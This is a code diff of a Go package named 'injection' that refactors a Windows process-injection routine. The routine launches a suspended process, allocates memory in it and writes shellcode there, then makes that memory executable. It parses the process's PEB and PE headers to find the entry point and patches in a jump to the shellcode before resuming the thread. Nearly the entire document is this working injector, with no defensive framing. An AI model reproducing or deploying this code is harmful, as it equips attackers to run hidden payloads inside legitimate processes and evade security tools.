@@ -2,63 +2,30 @@ package injection
 
 import (
 	"encoding/binary"
-	"fmt"
-	"syscall"
+	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 )
 
-func CreateProcessWithPipe() {
-	fmt.Println("Starting CreateProcessWithPipe")
+func CreateProcess() {
+	procInfo := createProcess()
 
-	// Start up all the pipes
-	var stdInRead windows.Handle
-	var stdInWrite windows.Handle
+	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
 
-	windows.CreatePipe(&stdInRead, &stdInWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
-
-	var stdOutRead windows.Handle
-	var stdOutWrite windows.Handle
-
-	windows.CreatePipe(&stdOutRead, &stdOutWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
-
-	var stdErrRead windows.Handle
-	var stdErrWrite windows.Handle
-
-	windows.CreatePipe(&stdErrRead, &stdErrWrite, &windows.SecurityAttributes{InheritHandle: 1}, 0)
-
-	// Create new proccess
-	procInfo := &windows.ProcessInformation{}
-	startupInfo := &windows.StartupInfo{
-		StdInput:   stdInRead,
-		StdOutput:  stdOutWrite,
-		StdErr:     stdErrWrite,
-		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
-		ShowWindow: 1,
-	}
-	windows.CreateProcess(syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"), syscall.StringToUTF16Ptr(""), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
-
-	// Allocate virtual mem with shellcode
-	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-
-	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
-		fmt.Printf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error())
-	}
-
-	// Write allocated shellcode to processor
+	// Workaround, cannot write to process memory before allocation finished, will have to fix for later.
+	time.Sleep(2)
 	WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 
-	// Set exec permission on address
 	oldProtect := PAGE_READWRITE
 	VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
 
 	type PEB struct {
 		//reserved1              [2]byte     // BYTE 0-1
-		InheritedAddressSpace    byte
-		ReadImageFileExecOptions byte
-		BeingDebugged            byte
-		reserved2                [1]byte
+		InheritedAddressSpace    byte    // BYTE	0
+		ReadImageFileExecOptions byte    // BYTE	1
+		BeingDebugged            byte    // BYTE	2
+		reserved2                [1]byte // BYTE 3
 		// ImageUsesLargePages          : 1;   //0x0003:0 (WS03_SP1+)
 		// IsProtectedProcess           : 1;   //0x0003:1 (Vista+)
 		// IsLegacyProcess              : 1;   //0x0003:2 (Vista+)
@@ -68,34 +35,33 @@ func CreateProcessWithPipe() {
 		// IsAppContainer               : 1;   //0x0003:6 (Win8_RTM+)
 		// SpareBit                     : 1;   //0x0003:7
 		//reserved3              [2]uintptr  // PVOID BYTE 4-8
-		Mutant                 uintptr
-		ImageBaseAddress       uintptr
-		Ldr                    uintptr
-		ProcessParameters      uintptr
-		reserved4              [3]uintptr
-		AtlThunkSListPtr       uintptr
-		reserved5              uintptr
-		reserved6              uint32
-		reserved7              uintptr
-		reserved8              uint32
-		AtlThunkSListPtr32     uint32
-		reserved9              [45]uintptr
-		reserved10             [96]byte
-		PostProcessInitRoutine uintptr
-		reserved11             [128]byte
-		reserved12             [1]uintptr
-		SessionId              uint32
+		Mutant                 uintptr     // BYTE 4
+		ImageBaseAddress       uintptr     // BYTE 8
+		Ldr                    uintptr     // PPEB_LDR_DATA
+		ProcessParameters      uintptr     // PRTL_USER_PROCESS_PARAMETERS
+		reserved4              [3]uintptr  // PVOID
+		AtlThunkSListPtr       uintptr     // PVOID
+		reserved5              uintptr     // PVOID
+		reserved6              uint32      // ULONG
+		reserved7              uintptr     // PVOID
+		reserved8              uint32      // ULONG
+		AtlThunkSListPtr32     uint32      // ULONG
+		reserved9              [45]uintptr // PVOID
+		reserved10             [96]byte    // BYTE
+		PostProcessInitRoutine uintptr     // PPS_POST_PROCESS_INIT_ROUTINE
+		reserved11             [128]byte   // BYTE
+		reserved12             [1]uintptr  // PVOID
+		SessionId              uint32      // ULONG
 	}
 
 	type PROCESS_BASIC_INFORMATION struct {
-		reserved1                    uintptr
-		PebBaseAddress               uintptr
-		reserved2                    [2]uintptr
-		UniqueProcessId              uintptr
-		InheritedFromUniqueProcessID uintptr
+		reserved1                    uintptr    // PVOID
+		PebBaseAddress               uintptr    // PPEB
+		reserved2                    [2]uintptr // PVOID
+		UniqueProcessId              uintptr    // ULONG_PTR
+		InheritedFromUniqueProcessID uintptr    // PVOID
 	}
 
-	// Query for PEB
 	var processInformation PROCESS_BASIC_INFORMATION
 	var returnLength uintptr
 	NtQueryInformationProcess.Call(uintptr(procInfo.Process), 0, uintptr(unsafe.Pointer(&processInformation)), unsafe.Sizeof(processInformation), returnLength)
@@ -103,38 +69,35 @@ func CreateProcessWithPipe() {
 	var peb PEB
 	var readBytes int32
 
-	// Read PEB
 	ReadProcessMemory.Call(uintptr(procInfo.Process), processInformation.PebBaseAddress, uintptr(unsafe.Pointer(&peb)), unsafe.Sizeof(peb), uintptr(unsafe.Pointer(&readBytes)))
 
 	type IMAGE_DOS_HEADER struct {
-		Magic    uint16
-		Cblp     uint16
-		Cp       uint16
-		Crlc     uint16
-		Cparhdr  uint16
-		MinAlloc uint16
-		MaxAlloc uint16
-		SS       uint16
-		SP       uint16
-		CSum     uint16
-		IP       uint16
-		CS       uint16
-		LfaRlc   uint16
-		Ovno     uint16
-		Res      [4]uint16
-		OEMID    uint16
-		OEMInfo  uint16
-		Res2     [10]uint16
-		LfaNew   int32
+		Magic    uint16     // USHORT Magic number
+		Cblp     uint16     // USHORT Bytes on last page of file
+		Cp       uint16     // USHORT Pages in file
+		Crlc     uint16     // USHORT Relocations
+		Cparhdr  uint16     // USHORT Size of header in paragraphs
+		MinAlloc uint16     // USHORT Minimum extra paragraphs needed
+		MaxAlloc uint16     // USHORT Maximum extra paragraphs needed
+		SS       uint16     // USHORT Initial (relative) SS value
+		SP       uint16     // USHORT Initial SP value
+		CSum     uint16     // USHORT Checksum
+		IP       uint16     // USHORT Initial IP value
+		CS       uint16     // USHORT Initial (relative) CS value
+		LfaRlc   uint16     // USHORT File address of relocation table
+		Ovno     uint16     // USHORT Overlay number
+		Res      [4]uint16  // USHORT Reserved words
+		OEMID    uint16     // USHORT OEM identifier (for e_oeminfo)
+		OEMInfo  uint16     // USHORT OEM information; e_oemid specific
+		Res2     [10]uint16 // USHORT Reserved words
+		LfaNew   int32      // LONG File address of new exe header
 	}
 
-	// Get image header
 	var dosHeader IMAGE_DOS_HEADER
 	var readBytes2 int32
 
 	ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress, uintptr(unsafe.Pointer(&dosHeader)), unsafe.Sizeof(dosHeader), uintptr(unsafe.Pointer(&readBytes2)))
 
-	// Read signature
 	var Signature uint32
 	var readBytes3 int32
 
@@ -197,7 +160,7 @@ func CreateProcessWithPipe() {
 		SizeOfUninitializedData     uint32
 		AddressOfEntryPoint         uint32
 		BaseOfCode                  uint32
-		BaseOfData                  uint32
+		BaseOfData                  uint32 // Different from 64 bit header
 		ImageBase                   uint64
 		SectionAlignment            uint32
 		FileAlignment               uint32
@@ -226,10 +189,10 @@ func CreateProcessWithPipe() {
 	var optHeader32 IMAGE_OPTIONAL_HEADER32
 	var readBytes5 int32
 
-	if peHeader.Machine == 34404 { // 0x8664
+	if peHeader.Machine == 34404 {
 		ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader64)), unsafe.Sizeof(optHeader64), uintptr(unsafe.Pointer(&readBytes5)))
 	}
-	if peHeader.Machine == 332 { // 0x14c
+	if peHeader.Machine == 332 {
 		ReadProcessMemory.Call(uintptr(procInfo.Process), peb.ImageBaseAddress+uintptr(dosHeader.LfaNew)+unsafe.Sizeof(Signature)+unsafe.Sizeof(peHeader), uintptr(unsafe.Pointer(&optHeader32)), unsafe.Sizeof(optHeader32), uintptr(unsafe.Pointer(&readBytes5)))
 	}
 
@@ -261,16 +224,8 @@ func CreateProcessWithPipe() {
 	epBuffer = append(epBuffer, byte(0xff))
 	epBuffer = append(epBuffer, byte(0xe0))
 
-	// Write shellcode buffer to suspended process
 	WriteProcessMemory.Call(uintptr(procInfo.Process), ep, uintptr(unsafe.Pointer(&epBuffer[0])), uintptr(len(epBuffer)))
-
-	// Resume process to start shellcode
 	windows.ResumeThread(procInfo.Thread)
-
-	// Close all the things
 	windows.CloseHandle(procInfo.Process)
 	windows.CloseHandle(procInfo.Thread)
-	windows.CloseHandle(stdOutWrite)
-	windows.CloseHandle(stdInRead)
-	windows.CloseHandle(stdErrWrite)
 }
